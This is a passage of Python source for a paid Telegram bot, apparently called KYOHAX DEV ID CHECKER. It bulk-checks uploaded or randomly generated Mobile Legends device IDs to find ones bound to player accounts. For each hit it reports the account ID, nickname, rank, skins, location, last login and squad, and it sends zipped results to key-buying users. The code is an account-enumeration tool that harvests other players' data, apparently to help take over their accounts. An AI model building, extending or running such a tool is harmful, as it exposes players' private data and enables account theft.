    m, s = divmod(s, 60)
    if m < 60: return f"{m}m{s}s"
    h, m = divmod(m, 60); return f"{h}h{m}m"

def _stat(icon, label, value, last=False):
    return f"{'┗' if last else '┣'} {icon}  {label:<11}: `{value}`"

def _esc(s): return str(s).replace("`", "'").replace("*", "").replace("_", " ")

def banner():
    return (f"◇  *K Y O H A X  D E V  I D*  ◇\n_{LINE_DOT}_\n"
            f"`⚡ DEV ID CHECKER ⚡  v{BOT_VERSION}`\n`⟐  Lookup Engine v1  ⟐`")

def render_welcome(name, is_admin, expiry, checked, hits):
    role = "👑  Admin — unlimited access" if is_admin else f"🎟️  Access until: `{expiry}`"
    return (
        f"{banner()}\n{LINE_HEAVY}\nWelcome, *{_esc(name)}*!\n\n{role}\n\n"
        f"{panel_title('Your Stats')}\n"
        f"{_stat('🔍','Checked', checked)}\n{_stat('🎯','Hits',    hits, last=True)}\n\n"
        f"{panel_title('Available Tools')}\n"
        "┣ 🔥 Bulk Check — send `.txt` of device IDs\n"
        "┣ 🔍 Single Check — one device ID\n"
        "┣ 🎲 Generate + Check — random IDs\n"
        "┣ 📊 Statistics\n"
        "┗ 📖 Help\n"
        f"{LINE_HEAVY}\n👑 {BRAND}"
    )

def render_no_key():
    return (
        f"{banner()}\n{LINE_HEAVY}\n🔒  *ACCESS RESTRICTED*\n\n"
        "This bot requires an access key.\n\n"
        f"{panel_title('Pricing')}\n"
        "┣ 💳 3 Days    · ₱50\n┣ 💳 7 Days    · ₱70\n"
        "┣ 💳 1 Month   · ₱100\n┗ 💳 Lifetime  · ₱150\n\n"
        f"📩 Contact admin: {BRAND}\n`/redeem <key>` to activate\n"
        f"{LINE_HEAVY}\n👑 {BRAND}"
    )

def render_live(snap, status="RUNNING"):
    total = max(snap["total"], 1); checked = snap["checked"]
    pct = checked / total * 100
    spd = snap.get("live_rate", 0)
    rem = max(total - checked, 0); eta = snap.get("eta", 0)
    icon = {"RUNNING": "⚡", "STOPPING": "🛑", "FINISHED": "✅"}.get(status, "⚡")
    return (
        f"{icon}  *LIVE SCAN*\n{LINE_HEAVY}\n"
        f"`{_bar(pct, 22)}` *{pct:5.1f}%*\n\n"
        f"{panel_title('Progress')}\n"
        f"{_stat('⏳','Checked', checked)}\n{_stat('⏹','Remain',  rem)}\n"
        f"{_stat('📁','Total',   total)}\n{_stat('⏱','Elapsed', _fmt_secs(snap['elapsed']), last=True)}\n"
        f"\n{panel_title('Results')}\n"
        f"{_stat('✅','Valid',   snap['hits'])}\n{_stat('🚫','Invalid', snap['invalid'])}\n"
        f"{_stat('❌','Errors',  snap['errors'], last=True)}\n"
        f"\n{panel_title('Speed')}\n"
        f"┣ ⚡ Rate : `{spd:.1f}/s`\n┗ ⏳ ETA  : `{_fmt_secs(eta)}`\n"
        f"{LINE_HEAVY}\n👑 {BRAND}"
    )

def render_summary(snap, sdir):
    el = snap["elapsed"]
    spd = snap["total"] / max(el, 0.001)
    return (
        f"✅  *SCAN COMPLETE*\n{LINE_HEAVY}\n\n{panel_title('Metrics')}\n"
        f"{_stat('✅','Valid',   snap['hits'])}\n{_stat('🚫','Invalid', snap['invalid'])}\n"
        f"{_stat('❌','Errors',  snap['errors'])}\n{_stat('📁','Total',   snap['total'])}\n"
        f"{_stat('⏱','Time',   _fmt_secs(el))}\n{_stat('⚡','Speed',  f'{spd:.1f}/s', last=True)}\n\n"
        f"{panel_title('Output')}\n"
        f"┣ 📂 Folder : `{os.path.basename(sdir)}/`\n"
        "┣ 📄 All_Devices.txt\n┣ 📂 Registered/\n┣ 📂 Unregistered/\n┗ 📂 LookupErrors/\n"
        f"{LINE_HEAVY}\n👑 {BRAND}"
    )

def render_hit_line(device_id, pd):
    sid = device_id[-10:] if len(device_id) >= 10 else device_id
    nick = _esc(str(pd.get("nickname", "?"))[:20])
    lvl = pd.get("level", "?"); sk = pd.get("skin_count", "?")
    rank = str(pd.get("current_rank", "?"))[:14]
    return f"✅ `…{sid}`  ┃  *{nick}*  ┃  `Lv:{lvl}`  ┃  `🎨{sk}`  ┃  `🏆{rank}`"

# ────────────────────────────────────────────────────────────────
# KEYBOARDS
# ────────────────────────────────────────────────────────────────

def kb_main(admin=False):
    rows = [
        [InlineKeyboardButton("🔥  Bulk Check", callback_data="tool_bulk")],
        [InlineKeyboardButton("🔍  Single Check", callback_data="tool_single")],
        [InlineKeyboardButton("🎲  Generate + Check", callback_data="tool_generate")],
        [InlineKeyboardButton("📊  Statistics", callback_data="tool_stats")],
        [InlineKeyboardButton("💳  Buy Key", callback_data="menu_buy"),
         InlineKeyboardButton("📖  Help", callback_data="menu_help")],
    ]
    if admin:
        rows.append([InlineKeyboardButton("👑  ADMIN PANEL", callback_data="open_admin")])
    return InlineKeyboardMarkup(rows)

def kb_back(admin=False):
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙  Main Menu", callback_data="back_menu")]])

def kb_admin():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Gen Key", callback_data="adm_genkey"),
         InlineKeyboardButton("👥 Users", callback_data="adm_users")],
        [InlineKeyboardButton("📊 Stats", callback_data="adm_stats"),
         InlineKeyboardButton("⚡ Running", callback_data="adm_running")],
        [InlineKeyboardButton("🔙  Main Menu", callback_data="back_menu")],
    ])

# ────────────────────────────────────────────────────────────────
# SAFE EDIT
# ────────────────────────────────────────────────────────────────

async def safe_edit(q, text, parse_mode="Markdown", reply_markup=None):
    try:
        return await q.edit_message_text(text, parse_mode=parse_mode, reply_markup=reply_markup)
    except BadRequest as e:
        if "message is not modified" in str(e).lower(): return None
    except Exception:
        pass
    try:
        chat_id = q.message.chat_id if q.message else q.from_user.id
        return await q.get_bot().send_message(chat_id=chat_id, text=text,
                                              parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception:
        return None

async def safe_edit_msg(msg, text, parse_mode="Markdown", reply_markup=None):
    try:
        return await msg.edit_text(text, parse_mode=parse_mode, reply_markup=reply_markup)
    except BadRequest as e:
        if "message is not modified" in str(e).lower(): return None
    except Exception:
        pass
    try:
        return await msg.reply_text(text, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception:
        return None

# ────────────────────────────────────────────────────────────────
# MEMBERSHIP GATE
# ────────────────────────────────────────────────────────────────

_mc = {}; _mc_lock = threading.Lock(); _MC_TTL = 60.0

async def check_membership(bot, uid):
    if uid == OWNER_ID: return True, []
    now = time.time()
    with _mc_lock:
        c = _mc.get(uid)
        if c and (now - c[0]) < _MC_TTL: return c[1], c[2]
    missing = []
    for ch in REQUIRED_CHANNELS:
        try:
            m = await bot.get_chat_member(chat_id=ch["id"], user_id=uid)
            if m.status in ("left", "kicked"): missing.append(ch["name"])
        except Exception: pass
    ok = (len(missing) == 0)
    with _mc_lock: _mc[uid] = (now, ok, missing)
    return ok, missing

def invalidate_membership(uid):
    with _mc_lock: _mc.pop(uid, None)

def kb_join():
    rows = [[InlineKeyboardButton(f"📢 Join {c['name']}", url=c["url"])] for c in REQUIRED_CHANNELS]
    rows.append([InlineKeyboardButton("✅ I've Joined — Verify", callback_data="verify_join")])
    return InlineKeyboardMarkup(rows)

def render_join(first="there"):
    lines = ["◇  *CHANNEL VERIFICATION REQUIRED*  ◇", LINE_HEAVY, "",
             f"Hey *{_esc(first)}*, join all channels to unlock the bot:", ""]
    for ch in REQUIRED_CHANNELS: lines.append(f"  📢  [{ch['name']}]({ch['url']})")
    lines += ["", LINE_HEAVY, "After joining, tap *✅ I've Joined — Verify*", "", f"👑 {BRAND}"]
    return "\n".join(lines)

async def gate(update, ctx):
    user = update.effective_user
    if user.id == OWNER_ID: return True
    ok, _ = await check_membership(ctx.bot, user.id)
    if ok: return True
    text = render_join(user.first_name or "there"); kb = kb_join()
    if update.callback_query:
        try: await update.callback_query.edit_message_text(text, parse_mode="Markdown", reply_markup=kb)
        except Exception:
            try: await ctx.bot.send_message(chat_id=user.id, text=text, parse_mode="Markdown", reply_markup=kb)
            except Exception: pass
    else:
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=kb)
    return False

# ────────────────────────────────────────────────────────────────
# ZIP
# ────────────────────────────────────────────────────────────────

TG_MAX = 49 * 1024 * 1024

def zip_results(folder):
    folder = Path(folder)
    files = sorted([f for f in folder.rglob("*") if f.is_file() and not f.name.endswith(".zip")])
    if not files: return []
    out = folder / "results.zip"
    try:
        with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zf:
            for f in files: zf.write(f, f.relative_to(folder))
        if out.stat().st_size <= TG_MAX: return [out]
        out.unlink()
        parts = []; pn = 1; cf = []; cs = 0
        for f in files:
            fs = f.stat().st_size
            if cf and cs + fs > TG_MAX:
                po = folder / f"results_part{pn}.zip"
                with zipfile.ZipFile(po, "w", zipfile.ZIP_DEFLATED) as zf:
                    for x in cf: zf.write(x, x.relative_to(folder))
                parts.append(po); pn += 1; cf = []; cs = 0
            cf.append(f); cs += fs
        if cf:
            po = folder / f"results_part{pn}.zip"
            with zipfile.ZipFile(po, "w", zipfile.ZIP_DEFLATED) as zf:
                for x in cf: zf.write(x, x.relative_to(folder))
            parts.append(po)
        return parts
    except Exception:
        return []

# ────────────────────────────────────────────────────────────────
# BULK JOB
# ────────────────────────────────────────────────────────────────

def run_bulk_job(job, loop, app):
    user_id  = job["user_id"]
    chat_id  = job["chat_id"]
    msg_id   = job["msg_id"]
    devices  = job["devices"]
    threads  = job["threads"]

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    sdir = os.path.join(RESULTS_DIR, f"session_{user_id}_{ts}")
    os.makedirs(sdir, exist_ok=True)

    rm = TelegramResultsManager(sdir, f"session_{user_id}_{ts}")
    stats = LiveStats(len(devices)); job["stats"] = stats
    stop_event = threading.Event(); job["stop_event"] = stop_event
    _last = [0.0]

    def upd(force=False, status="RUNNING"):
        now = time.time()
        if not force and (now - _last[0]) < 1.5: return
        _last[0] = now
        snap = stats.snapshot(); text = render_live(snap, status)
        kb = [[InlineKeyboardButton("🛑  Stop", callback_data=f"stop_{user_id}")]]
        try:
            fut = asyncio.run_coroutine_threadsafe(app.bot.edit_message_text(
                chat_id=chat_id, message_id=msg_id, text=text, parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(kb)), loop)
            fut.result(timeout=10)
        except Exception: pass

    import queue as _q
    hq = _q.Queue()
    def hit_sender():
        while True:
            m = hq.get()
            if m is None: break
            for _ in range(3):
                try:
                    fut = asyncio.run_coroutine_threadsafe(
                        app.bot.send_message(chat_id=chat_id, text=m, parse_mode="Markdown"), loop)
                    fut.result(timeout=30); time.sleep(0.4); break
                except Exception:
                    time.sleep(1.5)
    ht = threading.Thread(target=hit_sender, daemon=False); ht.start()

    def worker(did):
        if job.get("stopped") or stop_event.is_set(): return
        try:
            result = lookup_by_device_id(did)
        except Exception as e:
            result = {'status': 'error', 'error': str(e), 'device_id': did}

        stats.inc("checked")
        if result['status'] == 'error':
            stats.inc("errors")
            rm.add({'device_id': did, 'is_registered': False, 'status': 'error',
                    'error': result.get('error', 'Unknown')})
        elif result.get('is_registered'):
            pd = result.get('player_data', {}) or {}
            if result.get('lookup_status') == 'success' and pd.get('nickname'):
                stats.inc("hits")
                hq.put(render_hit_line(did, pd))
            else:
                stats.inc("hits")
                hq.put(render_hit_line(did, {'nickname': f"ID {result.get('account_id')}"}))
            rm.add({
                'device_id': did, 'is_registered': True,
                'account_id': result.get('account_id'),
                'zone_id': result.get('zone_id'),
                'status': result['status'],
                'lookup_status': result.get('lookup_status', 'N/A'),
                'lookup_error': result.get('lookup_error', ''),
                'player_data': pd,
            })
        else:
            stats.inc("invalid")
            rm.add({'device_id': did, 'is_registered': False,
                    'status': 'unregistered'})
        upd()

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(worker, d) for d in devices]
        while True:
            snap = stats.snapshot()
            done = (snap["checked"] >= snap["total"]) or job.get("stopped") or stop_event.is_set()
            upd()
            if done: break
            time.sleep(0.2)
        upd(force=True, status="STOPPING")
        for f in futs: f.cancel()

    hq.put(None); ht.join(timeout=180)

    asyncio.run_coroutine_threadsafe(
        user_manager.update_stats(user_id, checked=stats.checked, hits=stats.hits), loop)

    snap = stats.snapshot()
    summary = render_summary(snap, sdir)
    time.sleep(0.5); edited = False
    for _ in range(3):
        try:
            fut = asyncio.run_coroutine_threadsafe(app.bot.edit_message_text(
                chat_id=chat_id, message_id=msg_id, text=summary, parse_mode="Markdown",
                reply_markup=kb_back(user_id == OWNER_ID)), loop)
            fut.result(timeout=30); edited = True; break
        except Exception: time.sleep(1)
    if not edited:
        try:
            asyncio.run_coroutine_threadsafe(
                app.bot.send_message(chat_id=chat_id, text=summary, parse_mode="Markdown",
                                     reply_markup=kb_back(user_id == OWNER_ID)), loop)
        except Exception: pass

    # Send zip
    try:
        zips = zip_results(Path(sdir))
        for zp in zips[:3]:
            for _ in range(3):
                try:
                    with open(zp, "rb") as f:
                        fut = asyncio.run_coroutine_threadsafe(app.bot.send_document(
                            chat_id=chat_id, document=f, filename=f"kyohax_results_{ts}.zip"), loop)
                        fut.result(timeout=60); break
                except Exception: time.sleep(2)
        try: shutil.rmtree(sdir, ignore_errors=True)
        except Exception: pass
    except Exception: pass

    with job_lock: active_jobs.pop(user_id, None)

# ────────────────────────────────────────────────────────────────
# GENERATE + CHECK JOB
# ────────────────────────────────────────────────────────────────

def run_generate_job(job, loop, app):
    user_id = job["user_id"]; chat_id = job["chat_id"]; msg_id = job["msg_id"]
    count   = job["count"];    threads = job["threads"]

    gen = MLBBDeviceIDGenerator()
    devices = gen.generate_smart(count)

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    sdir = os.path.join(RESULTS_DIR, f"gen_{user_id}_{ts}")
    os.makedirs(sdir, exist_ok=True)

    # Save generated list
    try:
        with open(os.path.join(sdir, f"generated_{ts}.txt"), "w", encoding="utf-8") as f:
            f.write("\n".join(devices))
    except Exception: pass

    rm = TelegramResultsManager(sdir, f"gen_{user_id}_{ts}")
    stats = LiveStats(len(devices)); job["stats"] = stats
    stop_event = threading.Event(); job["stop_event"] = stop_event
    _last = [0.0]

    def upd(force=False, status="RUNNING"):
        now = time.time()
        if not force and (now - _last[0]) < 1.5: return
        _last[0] = now
        snap = stats.snapshot(); text = render_live(snap, status)
        kb = [[InlineKeyboardButton("🛑  Stop", callback_data=f"stop_{user_id}")]]
        try:
            fut = asyncio.run_coroutine_threadsafe(app.bot.edit_message_text(
                chat_id=chat_id, message_id=msg_id, text=text, parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(kb)), loop)
            fut.result(timeout=10)
        except Exception: pass

    import queue as _q
    hq = _q.Queue()
    def hit_sender():
        while True:
            m = hq.get()
            if m is None: break
            for _ in range(3):
                try:
                    fut = asyncio.run_coroutine_threadsafe(
                        app.bot.send_message(chat_id=chat_id, text=m, parse_mode="Markdown"), loop)
                    fut.result(timeout=30); time.sleep(0.4); break
                except Exception:
                    time.sleep(1.5)
    ht = threading.Thread(target=hit_sender, daemon=False); ht.start()

    def worker(did):
        if job.get("stopped") or stop_event.is_set(): return
        try:
            result = lookup_by_device_id(did)
        except Exception as e:
            result = {'status': 'error', 'error': str(e), 'device_id': did}
        stats.inc("checked")
        if result['status'] == 'error':
            stats.inc("errors")
            rm.add({'device_id': did, 'is_registered': False, 'status': 'error',
                    'error': result.get('error', 'Unknown')})
        elif result.get('is_registered'):
            pd = result.get('player_data', {}) or {}
            stats.inc("hits")
            hq.put(render_hit_line(did, pd if pd.get("nickname") else {'nickname': f"ID {result.get('account_id')}"}))
            rm.add({
                'device_id': did, 'is_registered': True,
                'account_id': result.get('account_id'),
                'zone_id': result.get('zone_id'),
                'status': result['status'],
                'lookup_status': result.get('lookup_status', 'N/A'),
                'lookup_error': result.get('lookup_error', ''),
                'player_data': pd,
            })
        else:
            stats.inc("invalid")
            rm.add({'device_id': did, 'is_registered': False,
                    'status': 'unregistered'})
        upd()

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(worker, d) for d in devices]
        while True:
            snap = stats.snapshot()
            done = (snap["checked"] >= snap["total"]) or job.get("stopped") or stop_event.is_set()
            upd()
            if done: break
            time.sleep(0.2)
        upd(force=True, status="STOPPING")
        for f in futs: f.cancel()

    hq.put(None); ht.join(timeout=180)

    asyncio.run_coroutine_threadsafe(
        user_manager.update_stats(user_id, checked=stats.checked, hits=stats.hits), loop)

    snap = stats.snapshot()
    summary = render_summary(snap, sdir)
    time.sleep(0.5); edited = False
    for _ in range(3):
        try:
            fut = asyncio.run_coroutine_threadsafe(app.bot.edit_message_text(
                chat_id=chat_id, message_id=msg_id, text=summary, parse_mode="Markdown",
                reply_markup=kb_back(user_id == OWNER_ID)), loop)
            fut.result(timeout=30); edited = True; break
        except Exception: time.sleep(1)
    if not edited:
        try:
            asyncio.run_coroutine_threadsafe(
                app.bot.send_message(chat_id=chat_id, text=summary, parse_mode="Markdown",
                                     reply_markup=kb_back(user_id == OWNER_ID)), loop)
        except Exception: pass

    try:
        zips = zip_results(Path(sdir))
        for zp in zips[:3]:
            for _ in range(3):
                try:
                    with open(zp, "rb") as f:
                        fut = asyncio.run_coroutine_threadsafe(app.bot.send_document(
                            chat_id=chat_id, document=f, filename=f"kyohax_gen_{ts}.zip"), loop)
                        fut.result(timeout=60); break
                except Exception: time.sleep(2)
        try: shutil.rmtree(sdir, ignore_errors=True)
        except Exception: pass
    except Exception: pass

    with job_lock: active_jobs.pop(user_id, None)

# ────────────────────────────────────────────────────────────────
# COMMANDS
# ────────────────────────────────────────────────────────────────

async def cmd_start(update, ctx):
    uid = update.effective_user.id
    await user_manager.register_user(uid, update.effective_user.username, update.effective_user.first_name)
    if not await gate(update, ctx): return
    auth, _ = await user_manager.is_authorized(uid)
    is_admin = (uid == OWNER_ID)
    if auth:
        ui = await user_manager.get_user_info(uid) or {}
        st = ui.get("stats", {})
        es = ui.get("key_expiry")
        if es:
            try:
                e = datetime.fromisoformat(es)
                ed = "Lifetime" if e.year == 9999 else e.strftime("%Y-%m-%d %H:%M")
            except Exception: ed = "Unknown"
        else: ed = "None"
        await update.message.reply_text(
            render_welcome(update.effective_user.first_name or "friend", is_admin, ed,
                           st.get('total_checked', 0), st.get('total_hits', 0)),
            parse_mode="Markdown", reply_markup=kb_main(admin=is_admin))
    else:
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("💳 Buy Key", callback_data="menu_buy")],
            [InlineKeyboardButton("📖 Help", callback_data="menu_help")]])
        await update.message.reply_text(render_no_key(), parse_mode="Markdown", reply_markup=kb)

async def cmd_redeem(update, ctx):
    uid = update.effective_user.id
    await user_manager.register_user(uid, update.effective_user.username, update.effective_user.first_name)
    if not await gate(update, ctx): return
    if not ctx.args:
        await update.message.reply_text("Usage: `/redeem <key>`", parse_mode="Markdown"); return
    key = ctx.args[0].strip()
    ok, msg = await user_manager.redeem_key(uid, key)
    if ok:
        ui = await user_manager.get_user_info(uid)
        exp = datetime.fromisoformat(ui["key_expiry"])
        await update.message.reply_text(
            f"✅ *KEY REDEEMED*\n{LINE_HEAVY}\n┣ 🔑 Key   : `{key}`\n"
            f"┗ ⏳ Until : `{exp.strftime('%Y-%m-%d %H:%M')}`\n{LINE_HEAVY}\nUse /start.",
            parse_mode="Markdown")
    else:
        await update.message.reply_text(f"❌ {msg}")

async def cmd_help(update, ctx):
    if not await gate(update, ctx): return
    await update.message.reply_text(
        f"◇  *HELP*  ◇\n{LINE_HEAVY}\n"
        "┣ 🔥 Bulk Check — `.txt` file with device IDs\n"
        "┣ 🔍 Single Check — send one device ID\n"
        "┣ 🎲 Generate + Check — random IDs\n"
        "┣ 📊 Statistics — counters\n\n"
        "`/redeem` · `/start` · `/stop` · `/status`\n"
        f"{LINE_HEAVY}\n👑 {BRAND}", parse_mode="Markdown")

async def cmd_stop(update, ctx):
    if not await gate(update, ctx): return
    uid = update.effective_user.id
    stopped = False
    with job_lock:
        job = active_jobs.get(uid)
        if job:
            job["stopped"] = True
            ev = job.get("stop_event")
            if ev: ev.set()
            stopped = True
    await update.message.reply_text("🛑 Stopping…" if stopped else "No active job.")

async def cmd_status(update, ctx):
    if not await gate(update, ctx): return
    uid = update.effective_user.id
    with job_lock: job = active_jobs.get(uid)
    if job and "stats" in job:
        s = job["stats"].snapshot()
        await update.message.reply_text(render_live(s), parse_mode="Markdown")
    else:
        await update.message.reply_text("No active job.")

def admin_only(fn):
    from functools import wraps
    @wraps(fn)
    async def w(update, context):
        if update.effective_user.id != OWNER_ID:
            await update.message.reply_text("❌ Admin only."); return
        return await fn(update, context)
    return w

@admin_only
async def cmd_admin(update, ctx):
    await update.message.reply_text(f"◇  *ADMIN PANEL*  ◇\n{LINE_HEAVY}",
        reply_markup=kb_admin(), parse_mode="Markdown")

@admin_only
async def cmd_genkey(update, ctx):
    args = ctx.args or []
    try:
        dt = args[0].lower()
        if dt == "lifetime": dv = 0; mu = int(args[1]) if len(args) > 1 else 1
        else: dv = int(args[1]); mu = int(args[2])
    except Exception:
        await update.message.reply_text(
            "Usage: `/genkey hours 24 1`\n`/genkey days 7 1`\n"
            "`/genkey months 1 1`\n`/genkey lifetime 1`", parse_mode="Markdown"); return
    keys, _ = await user_manager.generate_key(dv, dt, 1, mu)
    await update.message.reply_text(f"🔑 *KEY*\n{LINE_HEAVY}\n`{keys[0]}`\n{LINE_HEAVY}",
        parse_mode="Markdown")

@admin_only
async def cmd_ban_user(update, ctx):
    if not ctx.args: await update.message.reply_text("Usage: `/ban_user <id>`"); return
    ok = await user_manager.ban_user(int(ctx.args[0].strip()))
    await update.message.reply_text(f"{'✅' if ok else '❌'} `{ctx.args[0]}`")

@admin_only
async def cmd_unban_user(update, ctx):
    if not ctx.args: await update.message.reply_text("Usage: `/unban_user <id>`"); return
    ok = await user_manager.unban_user(int(ctx.args[0].strip()))
    await update.message.reply_text(f"{'✅' if ok else '❌'} `{ctx.args[0]}`")

@admin_only
async def cmd_stats(update, ctx):
    users = await user_manager.get_all_users()
    active = sum(1 for u in users.values() if u.get("activated"))
    banned = sum(1 for u in users.values() if u.get("banned"))
    await update.message.reply_text(
        f"◇  *BOT STATISTICS*  ◇\n{LINE_HEAVY}\n"
        f"┣ 👥 Users   : `{len(users)}`\n┣ ✅ Active  : `{active}`\n"
        f"┗ 🚫 Banned  : `{banned}`\n{LINE_HEAVY}\n👑 {BRAND}",
        parse_mode="Markdown")

# ────────────────────────────────────────────────────────────────
# HANDLERS
# ────────────────────────────────────────────────────────────────

async def handle_document(update, ctx):
    uid = update.effective_user.id
    if not await gate(update, ctx): return
    auth, reason = await user_manager.is_authorized(uid)
    if not auth:
        await update.message.reply_text(f"🚫 Access denied: `{reason}`", parse_mode="Markdown"); return
    with job_lock:
        job = active_jobs.get(uid, {})
        wants_bulk = job.get("awaiting_bulk_file")

    doc = update.message.document
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("Please send a `.txt` file."); return
    f = await ctx.bot.get_file(doc.file_id); data = await f.download_as_bytearray()

    if not wants_bulk:
        await update.message.reply_text("Use /start → 🔥 *Bulk Check* first.", parse_mode="Markdown"); return

    with job_lock:
        if uid in active_jobs and active_jobs[uid].get("status") == "running":
            await update.message.reply_text("⚠️ Job already running."); return

    lines = [l.strip() for l in data.decode(errors="ignore").splitlines() if l.strip()]
    # Deduplicate while preserving order
    seen = set(); devices = []
    for d in lines:
        if d not in seen:
            seen.add(d); devices.append(d)
    if not devices:
        await update.message.reply_text("No IDs found."); return

    threads = await user_manager.get_threads_limit(uid)
    pm = await update.message.reply_text(
        f"⚡ *LOADING BULK JOB*\n{LINE_HEAVY}\n┣ 📦 IDs     : `{len(devices)}`\n"
        f"┗ 🧵 Threads : `{threads}`\n{LINE_HEAVY}", parse_mode="Markdown")

    job = {
        "user_id": uid, "chat_id": update.effective_chat.id, "msg_id": pm.message_id,
        "devices": devices, "threads": threads,
        "stopped": False, "checked": 0, "total": len(devices),
        "started": time.time(), "status": "running", "mode": "bulk",
    }
    with job_lock:
        active_jobs[uid] = job
        active_jobs[uid].pop("awaiting_bulk_file", None)
    loop = asyncio.get_event_loop()
    threading.Thread(target=run_bulk_job, args=(job, loop, ctx.application), daemon=True).start()

async def on_text(update, ctx):
    uid = update.effective_user.id
    if not await gate(update, ctx): return
    auth, _ = await user_manager.is_authorized(uid)
    text = update.message.text or ""

    with job_lock:
        job = active_jobs.get(uid, {})
        awaiting_single = job.get("awaiting_single_device")
        awaiting_gen    = job.get("awaiting_gen_count")
        gen_threads     = job.get("gen_threads")

    if awaiting_gen and auth:
        with job_lock: active_jobs.get(uid, {}).pop("awaiting_gen_count", None)
        try:
            count = int(text.strip())
            if count < 1 or count > MAX_GENERATE_COUNT:
                raise ValueError
        except ValueError:
            await update.message.reply_text(
                f"❌ Send a number 1–{MAX_GENERATE_COUNT}.", parse_mode="Markdown"); return

        with job_lock:
            if uid in active_jobs and active_jobs[uid].get("status") == "running":
                await update.message.reply_text("⚠️ Job already running."); return

        threads = gen_threads if gen_threads else MAX_BULK_THREADS_DEFAULT
        pm = await update.message.reply_text(
            f"🎲 *GENERATE + CHECK*\n{LINE_HEAVY}\n"
            f"┣ 🎯 Count   : `{count}`\n┗ 🧵 Threads : `{threads}`\n{LINE_HEAVY}",
            parse_mode="Markdown")

        job = {
            "user_id": uid, "chat_id": update.effective_chat.id, "msg_id": pm.message_id,
            "count": count, "threads": threads,
            "stopped": False, "checked": 0, "total": count,
            "started": time.time(), "status": "running", "mode": "generate",
        }
        with job_lock:
            active_jobs[uid] = job
            active_jobs[uid].pop("gen_threads", None)
        loop = asyncio.get_event_loop()
        threading.Thread(target=run_generate_job, args=(job, loop, ctx.application), daemon=True).start()
        return

    if awaiting_single and auth:
        did = text.strip()
        with job_lock:
            active_jobs.get(uid, {}).pop("awaiting_single_device", None)
            if not active_jobs.get(uid): active_jobs.pop(uid, None)
        is_admin = (uid == OWNER_ID)

        msg = await update.message.reply_text(
            f"🔍 *SINGLE CHECK*\n{LINE_HEAVY}\n`{did}`\n{LINE_HEAVY}", parse_mode="Markdown")

        result = await asyncio.to_thread(lookup_by_device_id, did)

        if result.get('status') == 'error':
            await safe_edit_msg(msg,
                f"❌ *CHECK ERROR*\n{LINE_HEAVY}\n┣ 🆔 Device : `{did}`\n"
                f"┗ ⚠️ Reason : `{result.get('error', 'Unknown')}`\n{LINE_HEAVY}\n👑 {BRAND}",
                reply_markup=kb_back(is_admin)); return

        if not result.get('is_registered'):
            await safe_edit_msg(msg,
                f"🚫 *UNREGISTERED*\n{LINE_HEAVY}\n┣ 🆔 Device : `{did}`\n"
                f"┗ ⚠️ No account bound to this device\n{LINE_HEAVY}\n👑 {BRAND}",
                reply_markup=kb_back(is_admin))
            await user_manager.update_stats(uid, checked=1, hits=0)
            return

        pd = result.get('player_data', {}) or {}
        sb = pd.get('skin_breakdown', {}) or {}
        acc = result.get('account_id'); zn = result.get('zone_id')
        card = (
            f"✅ *HIT FOUND*\n{LINE_HEAVY}\n"
            f"{panel_title('Identity')}\n"
            f"┣ 🆔 Device : `{did}`\n┣ 🎮 Acc    : `{acc}`\n┣ 🌐 Zone   : `{zn}`\n"
            f"┣ 🏷 Nick   : *{_esc(pd.get('nickname', '—'))}*\n┗ 📈 Level  : `{pd.get('level', '—')}`\n"
            f"\n{panel_title('Ranks')}\n"
            f"┣ 🏆 Current: `{pd.get('current_rank', '—')}`\n┣ ⭐ High   : `{pd.get('high_rank', '—')}`\n"
            f"┣ 💠 Collector: `{pd.get('collector_tier', '—')}`\n┗ 💎 Points : `{pd.get('collector_point', 0):,}`\n"
            f"\n{panel_title('Collection')}\n"
            f"┣ 🦸 Heroes : `{pd.get('hero_count', '—')}`\n┣ 🎨 Skins  : `{pd.get('skin_count', '—')}`\n"
            f"┣ 👑 Supreme: `{sb.get('Supreme', 0)}`\n┣ 🥇 Grand  : `{sb.get('Grand', 0)}`\n"
            f"┣ 💎 Exquisite: `{sb.get('Exquisite', 0)}`\n┗ 🎁 Common : `{sb.get('Common', 0)}`\n"
            f"\n{panel_title('Other')}\n"
            f"┣ 🎯 WR     : `{pd.get('win_rate', 0)}%`\n┣ 🏅 MVP    : `{pd.get('mvp', 0)}`\n"
            f"┣ 📍 Loc    : `{pd.get('location', '—')}`\n┣ ⏰ Login  : `{pd.get('last_login', '—')}`\n"
            f"┗ 👥 Squad  : `{pd.get('squad', '—')}`\n"
            f"\n{LINE_DOT}\n👑 {BRAND}"
        )
        await safe_edit_msg(msg, card, reply_markup=kb_back(is_admin))
        await user_manager.update_stats(uid, checked=1, hits=1)
        return

async def handle_callback(update, ctx):
    q = update.callback_query
    try: await q.answer()
    except Exception: pass
    data = q.data or ""
    uid = update.effective_user.id
    is_admin = (uid == OWNER_ID)

    try:
        if data == "verify_join":
            invalidate_membership(uid)
            ok, missing = await check_membership(ctx.bot, uid)
            if ok: await safe_edit(q, "✅ *Verified!* Tap /start.", reply_markup=None)
            else:
                ml = "\n".join(f"  • {m}" for m in missing)
                await safe_edit(q, f"⚠️ Still missing:\n{ml}", reply_markup=kb_join())
            return

        if data == "back_menu":
            auth, _ = await user_manager.is_authorized(uid)
            if not auth:
                await safe_edit(q, render_no_key(),
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("💳 Buy", callback_data="menu_buy"),
                         InlineKeyboardButton("📖 Help", callback_data="menu_help")]]))
                return
            ui = await user_manager.get_user_info(uid) or {}
            st = ui.get("stats", {}); es = ui.get("key_expiry")
            if es:
                try:
                    e = datetime.fromisoformat(es)
                    ed = "Lifetime" if e.year == 9999 else e.strftime("%Y-%m-%d %H:%M")
                except Exception: ed = "Unknown"
            else: ed = "None"
            await safe_edit(q, render_welcome(
                    update.effective_user.first_name or "friend", is_admin, ed,
